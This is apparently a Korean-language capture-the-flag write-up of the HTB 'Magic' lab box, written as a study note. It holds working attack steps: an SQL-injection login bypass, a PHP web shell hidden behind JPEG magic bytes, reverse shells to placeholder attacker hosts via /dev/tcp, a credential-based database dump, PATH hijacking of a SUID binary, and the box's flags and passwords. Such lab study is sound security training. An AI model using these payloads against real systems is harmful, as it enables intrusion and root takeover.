---
slug: "magic"
title: "Magic"
date: 2026-06-22
category: "HTB"
tags: []
excerpt: "날짜 : 2026/06/21 소요시간:"
readingTime: 5
---

#### Box: Magic | Linux | Easy
날짜 : 2026/06/21
소요시간:

##### Open Ports
22 (ssh)
80 (http)

##### Interesting Services
80
##### Initial Foothold
벡터 : SQLi 로그인 우회 → 파일 업로드 필터 우회 → RCE(remote code execute)
명령어:

```bash
# 디렉토리 열거 - 정상 파일 업로드 후 이미지 주소 복사로 /images/uploads 확인 가능 (gobuster 두번 불필요)
gobuster dir -u http://{IP}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

burpsuite로 어떻게 로그인 필드 보내는지 확인 한번 해보는게 좋음
```
# SQLi 로그인 우회 (username 필드)
' or 1=1 --
```


```bash
# magic bytes + 이중확장자 웹쉘 생성
printf '\xff\xd8\xff' > exploit.php.jpg
echo '<?php system($_GET["cmd"]); ?>' >> exploit.php.jpg


# RCE - /bin/bash -c '...' 로 감싸야 리다이렉션 정상 처리됨 
http://{IP}/images/uploads/exploit.php.jpg?cmd=/bin/bash+-c+'/bin/bash+-i+>%26+/dev/tcp/{HOSTIP}/{Port}+0>%261'
```
-> 접속 성공
##### Privilege Escalation
**벡터 1: www-data → theseus (DB 크레덴셜 재사용)**

```bash
# 웹쉘은 TTY 없음 → su 불가 → pty로 해결
python3 -c 'import pty;pty.spawn("/bin/bash")'

# /var/www/Magic/db.php5 에서 DB 크레덴셜 확인
# dbUsername: theseus / dbUserPassword: iamkingtheseus → su 실패 (DB 비번 ≠ 시스템 비번)

# mysql 없을 때 mysqldump로 DB 덤프 → 웹 로그인 크레덴셜 획득
mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
# → Th3s3usW4sK1ng

su theseus  # password: Th3s3usW4sK1ng
```
**-> user.txt: 547d294ebe54443541325f4be6682818**


**벡터 2: theseus → root (PATH Hijacking)**
```bash
# SUID 바이너리 탐색
find / -user root -perm -4000 -ls 2>/dev/null
# → /bin/sysinfo (root 소유, users 그룹 실행 가능)

# sysinfo 실행하면 lshw/fdisk/cat/free 를 절대경로 없이 호출
# → PATH Hijacking 가능

# 가짜 fdisk 생성 (shebang 필수 - 확장자 없는 파일은 인터프리터 명시해야 함)
echo '#!/bin/bash' > /tmp/fdisk
echo '/bin/bash -i >& /dev/tcp/{LHOST}/5555 0>&1' >> /tmp/fdisk
chmod +x /tmp/fdisk

# PATH 앞에 /tmp 추가 → sysinfo 실행 시 진짜 fdisk 대신 가짜 fdisk 실행됨
export PATH=/tmp:$PATH
sysinfo
```

```bash
# 공격자
nc -lvnp 5555
cat /root/root.txt
```
** -> root.txt: 8dddd26df935175c95de8048c1c65b71**
###### Rabbit Hole
- db.php5 크레덴셜로 su 시도했으나 실패 → mysqldump로 실제 비번 획득
- Content-Type, 확장자 변형 여러 번 시도

###### 다음 박스에서 써먹을 것
- 웹 로그인 폼 → Burp로 POST 확인 → SQLi 시도
- 쉘 따면 `/var/www/` 뒤져서 DB 크레덴셜 파일 찾기 (`db.php`, `config.php`, `.env`)
- DB 크레덴셜 찾으면 mysqldump로 덤프, 나온 크레덴셜 전부 su/ssh 시도
- TTY 없으면 `python3 -c 'import pty;pty.spawn("/bin/bash")'`
- SUID 바이너리에서 절대경로 없이 명령 호출 → PATH Hijacking